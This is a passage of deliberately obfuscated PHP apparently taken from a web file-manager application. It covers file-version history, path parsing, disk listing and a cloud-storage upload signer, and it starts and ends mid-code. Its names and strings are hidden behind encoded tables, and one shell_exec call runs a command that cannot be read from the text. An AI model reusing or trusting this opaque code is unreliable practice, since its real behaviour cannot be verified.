= self::listData($¿Á‘÷”¡, !1); if (!$‹ÊŸ°À || !$‹ÊŸ°À[$è¡ÚÓÃú[378]]) { return !1; } $üé¨›ìê = $è¡ÚÓÃú[1230]; $…Ã‡‹’„ = $…Ã‡‹’„ ? $…Ã‡‹’„ : get_path_this($¿Á‘÷”¡); $Ê†¡Œä = $Ê†¡Œä ? $Ê†¡Œä : $‹ÊŸ°À[$è¡ÚÓÃú[1242]]; $µášôÜ· = substr(get_path_this($‹ÊŸ°À[$è¡ÚÓÃú[1243]]), 0, -strlen($üé¨›ìê)); foreach ($‹ÊŸ°À[$è¡ÚÓÃú[378]] as $…í÷ÅÇ => $è„Ú×Âò) { $ çÔ°ñÛ = $…Ã‡‹’„ . substr($è„Ú×Âò[$è¡ÚÓÃú[32]], strlen($µášôÜ·)); $Äİƒ¨¤‹ = IO::move($‹ÊŸ°À[$è¡ÚÓÃú[1242]] . $è„Ú×Âò[$è¡ÚÓÃú[32]], $Ê†¡Œä, !1, $ çÔ°ñÛ); if ($Äİƒ¨¤‹) { $‹ÊŸ°À[$è¡ÚÓÃú[378]][$…í÷ÅÇ][$è¡ÚÓÃú[32]] = $ çÔ°ñÛ; } } $‹ÊŸ°À[$è¡ÚÓÃú[1243]] = IO::move($‹ÊŸ°À[$è¡ÚÓÃú[1243]], $Ê†¡Œä, !1, $…Ã‡‹’„ . $üé¨›ìê); self::saveData($‹ÊŸ°À[$è¡ÚÓÃú[1243]], $‹ÊŸ°À[$è¡ÚÓÃú[378]]); self::clearEmptyFolder($‹ÊŸ°À[$è¡ÚÓÃú[1242]]); } public static function rollback($îú¹Æä, $ë“û´©ò) { $ø¶óÙíÕ =& $_SERVER[ñ÷§¡å]; $¡ÎáéùÓ = self::listData($îú¹Æä); if (!$¡ÎáéùÓ) { return; } $…ëÏÙ÷ = IO::info($îú¹Æä); foreach ($¡ÎáéùÓ[$ø¶óÙíÕ[378]] as $Ïûø×ëš => $ ş’…§Í) { if ($ ş’…§Í[$ø¶óÙíÕ[408]] == $ë“û´©ò) { self::add($îú¹Æä); $Õ™€ÔŠÃ = $¡ÎáéùÓ[$ø¶óÙíÕ[1242]] . $ ş’…§Í[$ø¶óÙíÕ[32]]; $ŸÂåÛáİ = IO::copy($Õ™€ÔŠÃ, IO::pathFather($îú¹Æä), REPEAT_REPLACE, $…ëÏÙ÷[$ø¶óÙíÕ[32]]); if ($ŸÂåÛáİ) { self::remove($îú¹Æä, $ë“û´©ò); } return $ŸÂåÛáİ; } } return !1; } public static function setDetail($¦¯È»à, $á·»•şÄ, $‚ÕŒÎæù) { $Ëùø Ş =& $_SERVER[ñ÷§¡å]; $ßèçÄ› = self::listData($¦¯È»à); if (!$ßèçÄ›) { return; } foreach ($ßèçÄ›[$Ëùø Ş[378]] as $ÛĞˆ¶æè => $ŒÒ™©è) { if ($ŒÒ™©è[$Ëùø Ş[408]] == $á·»•şÄ) { $ßèçÄ›[$Ëùø Ş[378]][$ÛĞˆ¶æè][$Ëùø Ş[1241]] = $‚ÕŒÎæù; self::saveData($ßèçÄ›[$Ëùø Ş[1243]], $ßèçÄ›[$Ëùø Ş[378]]); return !0; } } return !1; } public static function fileInfo($‘¤Š¯Òø, $Öù“üÏ‡) { $¹ÏÌ™ÆŸ =& $_SERVER[ñ÷§¡å]; $ÇÑÍ•™¾ = self::listData($‘¤Š¯Òø); if (!$ÇÑÍ•™¾) { show_json(LNG($¹ÏÌ™ÆŸ[115]), !1); } $–´–§şÙ = $¹ÏÌ™ÆŸ[12]; foreach ($ÇÑÍ•™¾[$¹ÏÌ™ÆŸ[378]] as $¶ãé…“ë => $»§Ò´°²) { if ($»§Ò´°²[$¹ÏÌ™ÆŸ[408]] != $Öù“üÏ‡) { continue; } $–´–§şÙ = $ÇÑÍ•™¾[$¹ÏÌ™ÆŸ[1242]] . $»§Ò´°²[$¹ÏÌ™ÆŸ[32]]; break; } if (!$–´–§şÙ) { show_json(LNG($¹ÏÌ™ÆŸ[115]), !1); } return IO::info($–´–§şÙ); } public static function fileOut($×–ó¯Òƒ, $—ö¨˜Æª, $òÒ¨İ±À = false) { $ØìŸíş¢ =& $_SERVER[ñ÷§¡å]; $¯ƒ‹Şµ = self::fileInfo($×–ó¯Òƒ, $—ö¨˜Æª); $½úÙ…òÉ =& $GLOBALS[$ØìŸíş¢[7]]; $òÒ¨İ±À = isset($½úÙ…òÉ[$ØìŸíş¢[1206]]) && $½úÙ…òÉ[$ØìŸíş¢[1206]] == 1; if (isset($½úÙ…òÉ[$ØìŸíş¢[33]]) && $½úÙ…òÉ[$ØìŸíş¢[33]] == $ØìŸíş¢[1244]) { return IO::fileOutImage($¯ƒ‹Şµ[$ØìŸíş¢[94]], $½úÙ…òÉ[$ØìŸíş¢[1245]]); } IO::fileOut($¯ƒ‹Şµ[$ØìŸíş¢[94]], $òÒ¨İ±À, get_path_this($×–ó¯Òƒ)); } public static function listData($ÜÇ¯Šú™, $×–‡µ™¿ = true) { $üşøÙë =& $_SERVER[ñ÷§¡å]; if ($×–‡µ™¿ && !IO::exist($ÜÇ¯Šú™)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÜÇ¯Šú™, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $‰íÌÏ¶Ù = self::pathHistory($ÜÇ¯Šú™); $Í¹À’¹ = array($üşøÙë[1243] => $‰íÌÏ¶Ù . $üşøÙë[1230], $üşøÙë[1242] => rtrim(get_path_father($‰íÌÏ¶Ù), $üşøÙë[8]) . $üşøÙë[8], $üşøÙë[378] => array()); $¡ŒÏ—³¦ = IO::getContent($Í¹À’¹[$üşøÙë[1243]]); if ($¡ŒÏ—³¦) { $œ¬ù¤é£ = json_decode($¡ŒÏ—³¦, !0); if (is_array($œ¬ù¤é£)) { $Í¹À’¹[$üşøÙë[378]] = $œ¬ù¤é£; } } return $Í¹À’¹; } private static function saveData($ÖÀÊÚÜè, $ıßÉ¥) { $È›©Û‚ =& $_SERVER[ñ÷§¡å]; self::log($È›©Û‚[1246] . $ÖÀÊÚÜè . $È›©Û‚[81] . count($ıßÉ¥), $È›©Û‚[765]); if ($ıßÉ¥) { return IO::setContent($ÖÀÊÚÜè, json_encode($ıßÉ¥)); } $«Ñ”šÓş = IO::pathFather($ÖÀÊÚÜè); IO::remove($ÖÀÊÚÜè); self::clearEmptyFolder($«Ñ”šÓş); return !0; } public static function clearEmptyFolder($´¸£¶Üû) { $¢î•ï§à =& $_SERVER[ñ÷§¡å]; if (trim($´¸£¶Üû, $¢î•ï§à[8]) == trim(self::$_historyBase, $¢î•ï§à[8])) { return; } $ Â—¯è´ = IO::pathFather($´¸£¶Üû); $üÂÉÖÙî = IO::has($´¸£¶Üû, !0); if ($üÂÉÖÙî[$¢î•ï§à[217]] > 0 || $üÂÉÖÙî[$¢î•ï§à[218]] > 0) { return; } IO::remove($´¸£¶Üû); self::clearEmptyFolder($ Â—¯è´); } private static function getBasePath() { $ŠÚ¯¹şŞ =& $_SERVER[ñ÷§¡å]; $ñğÒÌ×¦ = Model($ŠÚ¯¹şŞ[1247])->get($ŠÚ¯¹şŞ[1248]); if ($ñğÒÌ×¦) { if (!IO::exist($ñğÒÌ×¦)) { IO::mkdir($ñğÒÌ×¦); } if (get_path_this($ñğÒÌ×¦) == $ŠÚ¯¹şŞ[1233]) { $ğàÉ½—è = $ŠÚ¯¹şŞ[1249] . rand_string(8); @rename($ñğÒÌ×¦, get_path_father($ñğÒÌ×¦) . $ŠÚ¯¹şŞ[8] . $ğàÉ½—è); $ñğÒÌ×¦ = DATA_PATH . $ğàÉ½—è . $ŠÚ¯¹şŞ[8]; file_put_contents(DATA_PATH . $ŠÚ¯¹şŞ[1250], $ŠÚ¯¹şŞ[12]); Model($ŠÚ¯¹şŞ[1247])->set($ŠÚ¯¹şŞ[1248], $ñğÒÌ×¦); } return $ñğÒÌ×¦; } $ñğÒÌ×¦ = DATA_PATH . $ŠÚ¯¹şŞ[1249] . rand_string(8) . $ŠÚ¯¹şŞ[8]; $ñğÒÌ×¦ = IO::mkdir($ñğÒÌ×¦); $ñğÒÌ×¦ = rtrim($ñğÒÌ×¦, $ŠÚ¯¹şŞ[8]) . $ŠÚ¯¹şŞ[8]; file_put_contents($ñğÒÌ×¦ . $ŠÚ¯¹şŞ[1250], $ŠÚ¯¹şŞ[12]); file_put_contents(DATA_PATH . $ŠÚ¯¹şŞ[1250], $ŠÚ¯¹şŞ[12]); Model($ŠÚ¯¹şŞ[1247])->set($ŠÚ¯¹şŞ[1248], $ñğÒÌ×¦); return $ñğÒÌ×¦; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\x52\145\x63\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\106\x69\x6c\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\154\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\x70\122\157\157\164\123\x65\154\x66\175"; const KOD_USER_SHARE = "\173\x75\163\145\x72\123\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\123\150\141\162\145\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\162\x65\124\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\145\111\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\141\162\145\x49\164\145\x6d\114\151\156\x6b\x7d"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\154\157\x63\153\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\122\x65\156\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\166\x65\162\175"; public static function typeList() { $Ó™ìŒ‡æ =& $_SERVER[ñ÷§¡å]; return array($Ó™ìŒ‡æ[1251] => self::KOD_SOURCE, $Ó™ìŒ‡æ[1252] => self::KOD_USER_RECYCLE, $Ó™ìŒ‡æ[1253] => self::KOD_USER_FAV, $Ó™ìŒ‡æ[1254] => self::KOD_USER_FILE_TAG, $Ó™ìŒ‡æ[1255] => self::KOD_USER_FILE_TYPE, $Ó™ìŒ‡æ[1256] => self::KOD_GROUP_ROOT_SELF, $Ó™ìŒ‡æ[1257] => self::KOD_USER_SHARE, $Ó™ìŒ‡æ[1258] => self::KOD_USER_SHARE_LINK, $Ó™ìŒ‡æ[1259] => self::KOD_USER_SHARE_TO_ME, $Ó™ìŒ‡æ[1260] => self::KOD_SHARE_ITEM, $Ó™ìŒ‡æ[1261] => self::KOD_SHARE_LINK, $Ó™ìŒ‡æ[1262] => self::KOD_SEARCH, $Ó™ìŒ‡æ[1263] => self::KOD_BLOCK, $Ó™ìŒ‡æ[1264] => self::KOD_IO, $Ó™ìŒ‡æ[1265] => self::KOD_USER_RECENT, $Ó™ìŒ‡æ[1266] => self::KOD_USER_DRIVER); } public static function parse($®Ã¨ç„æ) { $ÍÈß³Ø® =& $_SERVER[ñ÷§¡å]; $®Ã¨ç„æ = self::clear($®Ã¨ç„æ); $‹·à‡ó = array_values(self::typeList()); preg_match($ÍÈß³Ø®[1267], $®Ã¨ç„æ, $ç™Ù©ô¯); $²ÚËŠ¬ç = array($ÍÈß³Ø®[431] => !1, $ÍÈß³Ø®[1268] => !1, $ÍÈß³Ø®[428] => !1, $ÍÈß³Ø®[94] => $®Ã¨ç„æ, $ÍÈß³Ø®[1177] => !1, $ÍÈß³Ø®[1176] => $ÍÈß³Ø®[12]); if (is_array($ç™Ù©ô¯) && count($ç™Ù©ô¯) == 5) { $÷ô»÷÷ = $ÍÈß³Ø®[1269] . $ç™Ù©ô¯[2] . $ÍÈß³Ø®[336]; if (in_array($÷ô»÷÷, $‹·à‡ó)) { $²ÚËŠ¬ç[$ÍÈß³Ø®[1177]] = $ç™Ù©ô¯[1]; $²ÚËŠ¬ç[$ÍÈß³Ø®[33]] = $÷ô»÷÷; $²ÚËŠ¬ç[$ÍÈß³Ø®[1270]] = substr($÷ô»÷÷, 1, -1); $²ÚËŠ¬ç[$ÍÈß³Ø®[408]] = $ç™Ù©ô¯[3]; } $²ÚËŠ¬ç[$ÍÈß³Ø®[1176]] = $ç™Ù©ô¯[4]; } $®°åÅğİ = array($ÍÈß³Ø®[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $²ÚËŠ¬ç[$ÍÈß³Ø®[1232]] = in_array($²ÚËŠ¬ç[$ÍÈß³Ø®[33]], $®°åÅğİ); return $²ÚËŠ¬ç; } public static function isTruePath($µµ»ñ†â) { $ïâ˜ŠøÖ =& $_SERVER[ñ÷§¡å]; if (substr($µµ»ñ†â, 0, 1) != $ïâ˜ŠøÖ[1269]) { return !0; } if (strpos($µµ»ñ†â, $ïâ˜ŠøÖ[417]) === 0) { return !0; } if (strpos($µµ»ñ†â, $ïâ˜ŠøÖ[1236]) === 0) { return !0; } if (strpos($µµ»ñ†â, $ïâ˜ŠøÖ[1271]) === 0) { return !0; } if (strpos($µµ»ñ†â, $ïâ˜ŠøÖ[1272]) === 0) { return !0; } if (strpos($µµ»ñ†â, $ïâ˜ŠøÖ[1273]) === 0) { return !0; } return !1; } public static function clear($ù²èØˆ¿) { $ÀáÄˆç½ =& $_SERVER[ñ÷§¡å]; $ù²èØˆ¿ = str_replace(array($ÀáÄˆç½[1085], $ÀáÄˆç½[65]), $ÀáÄˆç½[53], $ù²èØˆ¿); $ù²èØˆ¿ = str_replace($ÀáÄˆç½[107], $ÀáÄˆç½[8], $ù²èØˆ¿); $›ÓÙşÛ© = $ÀáÄˆç½[1274]; if (substr($ù²èØˆ¿, 0, 3) == $ÀáÄˆç½[1275]) { $ù²èØˆ¿ = substr($ù²èØˆ¿, 3); } while (strstr($ù²èØˆ¿, $›ÓÙşÛ©)) { $ù²èØˆ¿ = str_replace($›ÓÙşÛ©, $ÀáÄˆç½[8], $ù²èØˆ¿); } $ù²èØˆ¿ = preg_replace($ÀáÄˆç½[1276], $ÀáÄˆç½[8], $ù²èØˆ¿); if ($ù²èØˆ¿ == $ÀáÄˆç½[8]) { return $ÀáÄˆç½[8]; } $ù²èØˆ¿ = rtrim($ù²èØˆ¿, $ÀáÄˆç½[8]); return $ù²èØˆ¿; } public static function sourceID($Œ«İªÁË) { $¿§ÇÛÃ =& $_SERVER[ñ÷§¡å]; $óÌ¡À×” = self::parse($Œ«İªÁË); if ($óÌ¡À×”[$¿§ÇÛÃ[33]] !== self::KOD_SOURCE) { show_json(LNG($¿§ÇÛÃ[1277]), !1); } return $óÌ¡À×”[$¿§ÇÛÃ[408]]; } public static function make($Ù‹¢•ìˆ) { if (!$Ù‹¢•ìˆ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ù‹¢•ìˆ)); } public static function makeShare($ù¿‘â², $ÃÒµ”Ú) { return self::makePath(self::KOD_SHARE_ITEM, $ù¿‘â², $ÃÒµ”Ú); } public static function makeFileTypePath($ª»ÁÕí) { return self::makePath(self::KOD_USER_FILE_TYPE, $ª»ÁÕí); } public static function makeFileTagPath($Ç‘¨‘Ì) { return self::makePath(self::KOD_USER_FILE_TAG, $Ç‘¨‘Ì); } public static function makePath($†®Ê«, $Ğåœ¾Åí = '', $È×¼ã§ù = '') { $œ¿í¿Äà =& $_SERVER[ñ÷§¡å]; $ÏÜß¦Á¬ = substr($†®Ê«, 1, -1); $ÛÎÍÚÃ = $œ¿í¿Äà[1278] . $ÏÜß¦Á¬ . $œ¿í¿Äà[1279] . $Ğåœ¾Åí . $œ¿í¿Äà[1280]; $ÛÎÍÚÃ = $È×¼ã§ù ? $ÛÎÍÚÃ . $È×¼ã§ù . $œ¿í¿Äà[8] : $ÛÎÍÚÃ; return $ÛÎÍÚÃ; } public static function hashPath($ˆ¢˜ç’ü, $“Ø¿µ©× = true) { $Ùİ‘áøÙ =& $_SERVER[ñ÷§¡å]; $€«°³°µ = is_array($ˆ¢˜ç’ü) ? $ˆ¢˜ç’ü : IO::info($ˆ¢˜ç’ü); $¥´‰×å• = _get($€«°³°µ, $Ùİ‘áøÙ[1281], $Ùİ‘áøÙ[12]); if (!$¥´‰×å• && isset($€«°³°µ[$Ùİ‘áøÙ[411]])) { $€«°³°µ = IO::info(KodIO::make($€«°³°µ[$Ùİ‘áøÙ[411]])); $¥´‰×å• = _get($€«°³°µ, $Ùİ‘áøÙ[1281], $Ùİ‘áøÙ[12]); } if (!$¥´‰×å• && $“Ø¿µ©×) { $‰³¸µ²õ = KodIO::parse($€«°³°µ[$Ùİ‘áøÙ[94]]); if (!$‰³¸µ²õ[$Ùİ‘áøÙ[33]]) { $¥´‰×å• = IO::hashSimple($€«°³°µ[$Ùİ‘áøÙ[94]]); } } if (!$¥´‰×å•) { $¥´‰×å• = md5($€«°³°µ[$Ùİ‘áøÙ[94]] . $€«°³°µ[$Ùİ‘áøÙ[86]] . $€«°³°µ[$Ùİ‘áøÙ[95]]); } return $¥´‰×å•; } public static function initSystemPath() { $üÑ™¯ø =& $_SERVER[ñ÷§¡å]; if (defined($üÑ™¯ø[1282])) { return; } define($üÑ™¯ø[1282], self::systemPath($üÑ™¯ø[1283])); define($üÑ™¯ø[1284], self::systemPath($üÑ™¯ø[1285])); define($üÑ™¯ø[1286], self::systemPath($üÑ™¯ø[1287])); define($üÑ™¯ø[1288], self::systemPath($üÑ™¯ø[1289])); IOHistory::bindEvent(); } public static function systemPath($ã®îäğ) { $ıøŸãËñ =& $_SERVER[ñ÷§¡å]; $ë¸ŞáÅ° = $ıøŸãËñ[1290] . ucfirst($ã®îäğ); $‘½®î ñ = Model($ıøŸãËñ[783])->get($ë¸ŞáÅ°); if ($‘½®î ñ) { return $‘½®î ñ; } if ($ã®îäğ == $ıøŸãËñ[1283]) { $‘½®î ñ = self::make(Model($ıøŸãËñ[838])->systemRootPathAdd($ıøŸãËñ[553])); } else { $‘½®î ñ = self::systemPath($ıøŸãËñ[1283]); $ŸÜéÔÆø = self::sourceID($‘½®î ñ); $‘½®î ñ = self::make(Model($ıøŸãËñ[838])->mkdir($ŸÜéÔÆø, $ã®îäğ)); } Model($ıøŸãËñ[783])->set($ë¸ŞáÅ°, $‘½®î ñ); return $‘½®î ñ; } public static function systemFolder($®Ã‚¥ˆî) { $ñïºè²Œ = IO_PATH_SYSTEM_SOURCE . $®Ã‚¥ˆî; $ÔÎ‚‹­ = Cache::get($ñïºè²Œ); if (!$ÔÎ‚‹­) { $Ô¨Ìïã× = IO::infoFull($ñïºè²Œ); if (!$Ô¨Ìïã×) { $ÔÎ‚‹­ = IO::mkdir($ñïºè²Œ, REPEAT_SKIP); } else { $ÔÎ‚‹­ = $Ô¨Ìïã×[$_SERVER[ñ÷§¡å][94]]; } Cache::set($ñïºè²Œ, $ÔÎ‚‹­, 3600 * 10); } return $ÔÎ‚‹­; } public static function defaultDriver() { return Model($_SERVER[ñ÷§¡å][780])->defaultDriver(); } public static function defaultIO() { $•¶ìûèÒ =& $_SERVER[ñ÷§¡å]; $ŠÛ¿‡š = self::defaultDriver(); return $•¶ìûèÒ[1291] . $ŠÛ¿‡š[$•¶ìûèÒ[408]] . $•¶ìûèÒ[1280]; } public static function defaultDriverInit() { static $‹È Âºô = false; if ($‹È Âºô) { return $‹È Âºô; } $‹È Âºô = IO::init(self::defaultIO()); return $‹È Âºô; } public static function fileTypeList() { $ñœ£ı” =& $_SERVER[ñ÷§¡å]; $¥‚²Ğ·ˆ = $GLOBALS[$ñœ£ı”[6]][$ñœ£ı”[1292]]; foreach ($¥‚²Ğ·ˆ as $ßÉöû‹ë => $“Ìœ”ç) { $ë¼ÉÑ·à = $ñœ£ı”[1293] . $ßÉöû‹ë; $¦ò™˜ŒË = LNG($ë¼ÉÑ·à); if ($ë¼ÉÑ·à != $¦ò™˜ŒË) { $¥‚²Ğ·ˆ[$ßÉöû‹ë][$ñœ£ı”[32]] = $¦ò™˜ŒË; } } return $¥‚²Ğ·ˆ; } public static function diskList($’£İÜ = true) { $›‘èŸÎ¬ = $_SERVER[ñ÷§¡å][1294]; if ($’£İÜ) { $´™›¶ = Cache::get($›‘èŸÎ¬); if (is_array($´™›¶)) { return $´™›¶; } } $´™›¶ = self::diskListGet(); Cache::set($›‘èŸÎ¬, $´™›¶, 60); return $´™›¶; } public static function diskListGet() { $ê Á¥Æ =& $_SERVER[ñ÷§¡å]; $˜ ±¦ÄÑ = array(); if ($GLOBALS[$ê Á¥Æ[6]][$ê Á¥Æ[1295]] == $ê Á¥Æ[1296]) { $åÆßß » = $ê Á¥Æ[1297]; for ($¤Ô»µ…á = 0; $¤Ô»µ…á < strlen($åÆßß »); $¤Ô»µ…á++) { $Ñ•Àæçö = $åÆßß »[$¤Ô»µ…á] . $ê Á¥Æ[1298]; if (file_exists($Ñ•Àæçö)) { $˜ ±¦ÄÑ[] = $Ñ•Àæçö; } } return $˜ ±¦ÄÑ; } if (!function_exists($ê Á¥Æ[108])) { $˜ ±¦ÄÑ[] = $ê Á¥Æ[848]; return $˜ ±¦ÄÑ; } $«ÃèÆ¤Œ = explode($ê Á¥Æ[65], shell_exec($ê Á¥Æ[1299])); array_shift($«ÃèÆ¤Œ); array_pop($«ÃèÆ¤Œ); $¸Æ¯ƒÎ = array($ê Á¥Æ[1300], $ê Á¥Æ[1301], $ê Á¥Æ[1302], $ê Á¥Æ[1303], $ê Á¥Æ[1304], $ê Á¥Æ[1305], $ê Á¥Æ[1306], $ê Á¥Æ[1307]); foreach ($«ÃèÆ¤Œ as $˜ˆÍ«) { $ğø™éÊ„ = preg_split($ê Á¥Æ[1308], $˜ˆÍ«); $Ñ•Àæçö = $ğø™éÊ„[count($ğø™éÊ„) - 1]; if (!strstr($ğø™éÊ„[0], $ê Á¥Æ[1309]) || !$Ñ•Àæçö) { continue; } $ëÛ¬íŞı = rtrim($Ñ•Àæçö, $ê Á¥Æ[8]) . $ê Á¥Æ[8]; if (in_array($ëÛ¬íŞı, $¸Æ¯ƒÎ)) { continue; } $˜ ±¦ÄÑ[] = $ëÛ¬íŞı; } return $˜ ±¦ÄÑ; } public static function isSameDisk($ô˜œ˜Ùá, $î’¼ƒÇ) { $›Š¨§¥Ë =& $_SERVER[ñ÷§¡å]; if ($GLOBALS[$›Š¨§¥Ë[6]][$›Š¨§¥Ë[1295]] == $›Š¨§¥Ë[1296]) { return strtolower(substr($ô˜œ˜Ùá, 0, 1)) == strtolower(substr($î’¼ƒÇ, 0, 1)); } $©ê¡éáÒ = self::diskList(); $“³›àùˆ = !1; $ÎŠãÒü² = !1; sort($©ê¡éáÒ); $©ê¡éáÒ = array_reverse($©ê¡éáÒ); $ô˜œ˜Ùá = rtrim($ô˜œ˜Ùá, $›Š¨§¥Ë[8]) . $›Š¨§¥Ë[8]; $î’¼ƒÇ = rtrim($î’¼ƒÇ, $›Š¨§¥Ë[8]) . $›Š¨§¥Ë[8]; foreach ($©ê¡éáÒ as $ĞÖó“Íˆ) { $å¤õ’Õ˜ = strlen($ĞÖó“Íˆ); if (!$“³›àùˆ && substr($ô˜œ˜Ùá, 0, $å¤õ’Õ˜) == $ĞÖó“Íˆ) { $“³›àùˆ = $ĞÖó“Íˆ; } if (!$ÎŠãÒü² && substr($î’¼ƒÇ, 0, $å¤õ’Õ˜) == $ĞÖó“Íˆ) { $ÎŠãÒü² = $ĞÖó“Íˆ; } if ($“³›àùˆ && $ÎŠãÒü²) { break; } } return $“³›àùˆ === $ÎŠãÒü²; } public static function transferType($©¬®ºÁ, $œ¨“ØÁù) { $è×¾íœ¥ =& $_SERVER[ñ÷§¡å]; $ğÄ‚¨¢Ä = self::driverType($©¬®ºÁ); $×ììù‚ = self::driverType($œ¨“ØÁù); if ($ğÄ‚¨¢Ä[$è×¾íœ¥[33]] == $×ììù‚[$è×¾íœ¥[33]] && $ğÄ‚¨¢Ä[$è×¾íœ¥[1310]] == $×ììù‚[$è×¾íœ¥[1310]]) { return $è×¾íœ¥[1311]; } if ($ğÄ‚¨¢Ä[$è×¾íœ¥[33]] == $è×¾íœ¥[877] && $×ììù‚[$è×¾íœ¥[33]] == $è×¾íœ¥[116]) { return $è×¾íœ¥[1206]; } if ($ğÄ‚¨¢Ä[$è×¾íœ¥[33]] == $è×¾íœ¥[116] && $×ììù‚[$è×¾íœ¥[33]] == $è×¾íœ¥[877]) { return $è×¾íœ¥[117]; } return $è×¾íœ¥[1312]; } public static function driverType($»ãÈæ¼Û) { $³é¤‹âû =& $_SERVER[ñ÷§¡å]; $íàßÎÇˆ = str_replace($³é¤‹âû[1313], $³é¤‹âû[12], strtolower($»ãÈæ¼Û->getType())); if ($íàßÎÇˆ == $³é¤‹âû[771] || $íàßÎÇˆ == $³é¤‹âû[1314] || $íàßÎÇˆ == $³é¤‹âû[1315]) { $»ãÈæ¼Û = self::defaultDriverInit(); } else { if ($íàßÎÇˆ == $³é¤‹âû[1213] || $íàßÎÇˆ == $³é¤‹âû[1316]) { $»ãÈæ¼Û = IO::init($»ãÈæ¼Û->pathParse[$³é¤‹âû[1158]]); } } $ü”ë”Ô¦ = $»ãÈæ¼Û->path; $íàßÎÇˆ = str_replace($³é¤‹âû[1313], $³é¤‹âû[12], strtolower($»ãÈæ¼Û->getType())); if ($íàßÎÇˆ == $³é¤‹âû[116]) { return array($³é¤‹âû[33] => $³é¤‹âû[116], $³é¤‹âû[1310] => $³é¤‹âû[12], $³é¤‹âû[94] => $ü”ë”Ô¦); } return array($³é¤‹âû[33] => $³é¤‹âû[877], $³é¤‹âû[1310] => $»ãÈæ¼Û->pathDriver, $³é¤‹âû[94] => $ü”ë”Ô¦); } public static function pathDriverType($©”äª‡¬) { return $©”äª‡¬ ? self::driverType(IO::init($©”äª‡¬)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($™€îµ¯Ô) { parent::__construct($™€îµ¯Ô); $this->signatureVersion($_SERVER[ñ÷§¡å][226]); } public function uploadFormData($Şß¤œÑ, $ãĞŠÎó¦ = 3600) { $ºå¨‚øš =& $_SERVER[ñ÷§¡å]; $Øó€Äß€ = $ºå¨‚øš[208]; $™ëÕÏì = $ºå¨‚øš[241]; $ÍôìãŒ£ = $ºå¨‚øš[1317]; $¢¶³Ò†² = gmdate($ºå¨‚øš[1318], time() + $ãĞŠÎó¦); $ûÓˆüÙ = (string) time() . $ºå¨‚øš[81] . (string) (time() + $ãĞŠÎó¦); $â¿¾ˆ®» = array($ºå¨‚øš[1319] => $¢¶³Ò†², $ºå¨‚øš[1320] => array(array($ºå¨‚øš[1321] => $Øó€Äß€), array($ºå¨‚øš[1322] => $this->bucket), array($ºå¨‚øš[1323], $ºå¨‚øš[1324], $ºå¨‚øš[12]), array($ºå¨‚øš[1325] => $ÍôìãŒ£), array($ºå¨‚øš[1326] => $™ëÕÏì), array($ºå¨‚øš[1327] => $this->accessKey), array($ºå¨‚øš[1328] => $ûÓˆüÙ))); $â¿¾ˆ®» = json_encode($â¿¾ˆ®»); $õü£Ö´İ = hash_hmac($ºå¨‚øš[241], $ûÓˆüÙ, $this->secret); $¬ñë¶½£ = sha1($â¿¾ˆ®»); $·®²Å§½ = hash_hmac($ºå¨‚øš[241], $¬ñë¶½£, $õü£Ö´İ); $ Ë÷± ú = array($ºå¨‚øš[1321] => $Øó€Äß€, $ºå¨‚øš[1325] => $ÍôìãŒ£, $ºå¨‚øš[1329] => base64_encode($â¿¾ˆ®»), $ºå¨‚øš[1326] => $™ëÕÏì, $ºå¨‚øš[1327] => $this->accessKey, $ºå¨‚øš[1330] => $ûÓˆüÙ, $ºå¨‚øš[1331] => $·®²Å§½, $ºå¨‚øš[191] => $this->getHost()); return $ Ë÷± ú; } public function fileOutLink($Üë„Ë) { $ÛöÚÎü =& $_SERVER[ñ÷§¡å]; if (substr($Üë„Ë, 0, 7) == $ÛöÚÎü[1332]) { $Üë„Ë = $ÛöÚÎü[1333] . substr($Üë„Ë, 7); } header($ÛöÚÎü[171] . $Üë„Ë); die; } } goto fÒËëƒ‡Ê«; cÔà¤º‚‹°: class TaskHttp extends Task { protected function startAfter() { $‚Ã§™Šì =& $_SERVER[ñ÷§¡å]; $£‹Şå =& $this->task; $£‹Şå[$‚Ã§™Šì[1738]] = 1; Hook::bind($‚Ã§™Šì[1706], array($this, $‚Ã§™Šì[1739])); Hook::bind($‚Ã§™Šì[1708], array($this, $‚Ã§™Šì[1740])); Hook::bind($‚Ã§™Šì[1710], array($this, $‚Ã§™Šì[1741])); } protected function endAfter() { $µÎàÈ”Ğ =& $_SERVER[ñ÷§¡å]; Hook::unbind($µÎàÈ”Ğ[1706], array($this, $µÎàÈ”Ğ[1739])); Hook::unbind($µÎàÈ”Ğ[1708], array($this, $µÎàÈ”Ğ[1740])); Hook::unbind($µÎàÈ”Ğ[1710], array($this, $µÎàÈ”Ğ[1741])); } public function progressStart($İÎÀï†æ) { $İù€ëî÷ =& $_SERVER[ñ÷§¡å]; $ÛÊ•î  = curl_getinfo($İÎÀï†æ); self::log($İù€ëî÷[1742] . $ÛÊ•î [$İù€ëî÷[316]]); self::valueSet($this->task[$İù€ëî÷[408]], $this->task); } public function progressEnd($ô±Æíª½) { $Ìá”«ÄÛ =& $_SERVER[ñ÷§¡å]; self::log($Ìá”«ÄÛ[1743] . $this->task[$Ìá”«ÄÛ[408]]); $this->end(); } public function progress($ü±‡”œ, $‹±ÇîğŸ, 